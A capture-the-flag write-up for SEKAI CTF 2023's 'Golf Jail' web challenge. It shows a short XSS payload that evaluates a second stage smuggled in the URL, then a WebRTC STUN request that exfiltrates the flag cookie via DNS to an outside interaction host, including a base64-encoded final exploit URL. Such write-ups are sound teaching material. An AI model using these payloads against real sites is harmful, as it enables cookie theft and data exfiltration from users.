---
title: "SEKAI CTF 2023 - Golf Jail"
description: "JS Payload golfing and CSP Bypass using WebRTC"
lead: "JS Payload golfing and CSP Bypass using WebRTC"
date: 2023-01-01T00:00:00+00:00
lastmod: 2023-01-01T00:00:00+00:00
draft: false
images: []
menu:
  docs:
    parent: "writeup"
weight: 620
toc: true
---

> I did not manage to solve it during the CTF, but I decided to make a write-up afterwards as it was a very cool challenge.

## Challenge

I hope you like golfing ⛳🏌️⛳🏌️

- Challenge URL: [https://golfjail.chals.sekai.team/](https://golfjail.chals.sekai.team/)

```html
<?php
    header("Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; script-src 'unsafe-inline' 'unsafe-eval';");
    header("Cross-Origin-Opener-Policy: same-origin");

    $payload = "🚩🚩🚩";
    if (isset($_GET["xss"]) && is_string($_GET["xss"]) && strlen($_GET["xss"]) <= 30) {
        $payload = $_GET["xss"];
    }

    $flag = "SEKAI{test_flag}";
    if (isset($_COOKIE["flag"]) && is_string($_COOKIE["flag"])) {
        $flag = $_COOKIE["flag"];
    }
?>
<!DOCTYPE html>
<html>
    <body>
        <iframe
            sandbox="allow-scripts"
            srcdoc="<!-- <?php echo htmlspecialchars($flag) ?> --><div><?php echo htmlspecialchars($payload); ?></div>"
        ></iframe>
    </body>
</html>
```

> The admin bot only takes URLs of the format https://golfjail.chals.sekai.team/

## TL;DR

Create a tiny XSS to run a second payload contained inside the URL. This second payload will exfiltrate the flag and bypass the CSP using a DNS exfiltration with WebRTC.

## Write-Up

### Code Execution

Using `htmlspecialchars` within the `srcdoc` attribute doesn't prevent against HTML Injection/XSS. The code example below demonstrates that HTML entity codes are effectively interpreted inside the `iframe`. For more details, refer to [attr-iframe-srcdoc](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-srcdoc).

```js
function encodeHTMLEntities(text) {
  var textArea = document.createElement('textarea');
  textArea.innerText = text;
  return textArea.innerHTML;
}

document.write(`<iframe srcdoc='${encodeHTMLEntities("<img src=x onerror=alert()>")}'></iframe>`);
```

### Tiny XSS

We know how to execute an XSS, our next challenge is to bypass the 30 characters or less filter. To perform an XSS within this limit, we can use the URL to locate a part of our payload.

```python
>>> len("<svg onload=eval(location)>") # about:srcdoc
27
>>> len("<svg onload=eval(top.location)>") # https://golfjail.chals.sekai.team/...
31
>>> len("<svg onload=eval(baseURI)>") # https://golfjail.chals.sekai.team/...
26
```

When you're within an `iframe`, you can't employ the `location` attribute to access the top-level location and you can't use the `top.location` attribute because it exceeds the character limit. However, you can leverage the [baseURI](https://devdoc.net/web/developer.mozilla.org/en-US/docs/Web/API/Document/baseURI.html) property of the Node (in this case, the `svg`). This property provides the absolute base URL of the document housing the node.

{{< details "Iframe's sandbox & COOP" >}}
Futhermore, you cannot access the `top` window context because of the [sandbox](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#sandbox) iframe's attribute. Also, you cannot access the `opener` attribute from other origin because the [Cross-Origin-Opener-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cross-Origin-Opener-Policy) header is set to `same-origin` (cross-origin documents are not loaded in the same browsing context).

```
=> WORKING
document.write("<iframe srcdoc='<script>alert(top.location)</script>'></iframe>")

=> NOT WORKING (Blocked by sandbox attribute)
document.write("<iframe sandbox='allow-scripts' srcdoc='<script>alert(top.location)</script>'></iframe>")

=> Depends on Cross-Origin-Opener-Policy, here only same-origin
document.write("<iframe sandbox='allow-scripts' srcdoc='<script>console.log(top.opener)</script>'></iframe>")
```

{{< /details >}}

As we cannot directly evalute the `baseURI` property, we can create a string that will contain the URL, close this string and initiate our second payload. This means the second payload resides both within the URL and outside the `xss` parameter, allowing us to bypass the character limit.

```
golfjail.chals.sekai.team/?xss=<svg onload=eval(`'`+baseURI)>#'+PAYLOAD2

1. 'https://golfjail.chals.sekai.team/?xss=<svg onload=eval(`'`+baseURI)>#'
2. +
3. PAYLOAD2

=> eval('https://.../?xss=eval(%60%27%60%2BbaseURI)>#' + PAYLOAD2)
```

### CSP Bypass

Now that we can execute an XSS without dealing with the character size resitriction, our final step is to find a CSP bypass to extract the flag. For this purpose, we can use a DNS exfiltration via WebRTC.

```
Content-Security-Policy:
    default-src 'none';
    frame-ancestors 'none';
    script-src 'unsafe-inline' 'unsafe-eval';
```

WebRTC exfiltration payload:

```js
var flag = document.firstChild.data.split('').map(x=>x.charCodeAt(0).toString(16)).join('').substr(32,48);
var pc = new RTCPeerConnection({
    "iceServers": [{
        "urls": ["stun:" + flag + ".ckpaek22vtc0000kjaw0gj5f8jhyyyyyb.oast.fun"]
    }]
});
pc.createOffer({
    offerToReceiveAudio: 1
}).then(o => pc.setLocalDescription(o));
```

Final payload:

```
https://golfjail.chals.sekai.team/?xss=%3Csvg%20onload=eval(`%27`%2BbaseURI)%3E#'+eval(atob('dmFyIGZsYWcgPSBkb2N1bWVudC5maXJzdENoaWxkLmRhdGEuc3BsaXQoJycpLm1hcCh4PT54LmNoYXJDb2RlQXQoMCkudG9TdHJpbmcoMTYpKS5qb2luKCcnKS5zdWJzdHIoMzIsNDgpOwp2YXIgcGMgPSBuZXcgUlRDUGVlckNvbm5lY3Rpb24oewogICAgImljZVNlcnZlcnMiOiBbewogICAgICAgICJ1cmxzIjogWyJzdHVuOiIgKyBmbGFnICsgIi5ja3BhZWsyMnZ0YzAwMDBramF3MGdqNWY4amh5eXl5eWIub2FzdC5mdW4iXQogICAgfV0KfSk7CnBjLmNyZWF0ZU9mZmVyKHsKICAgIG9mZmVyVG9SZWNlaXZlQXVkaW86IDEKfSkudGhlbihvID0+IHBjLnNldExvY2FsRGVzY3JpcHRpb24obykpOw=='))
```

> **SEKAI{jsjails_4re_b3tter_th4n_pyjai1s!}**
